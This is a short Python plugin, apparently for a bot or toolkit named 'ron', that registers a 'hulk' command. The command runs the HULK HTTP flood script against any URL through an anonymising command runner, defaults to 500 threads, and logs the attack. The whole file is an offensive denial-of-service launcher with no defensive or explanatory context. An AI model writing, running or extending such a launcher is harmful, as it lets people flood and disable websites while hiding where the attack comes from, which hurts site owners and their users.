def register(ron):
    def launch_hulk(url, threads=500):
        cmd = f"python3 /root/HULK/hulk.py {url}"
        ron.anon.anon_command(cmd)
        ron.log(f"💥 ANON HULK: {url} ({threads}t)")
    
    return {"hulk": launch_hulk}
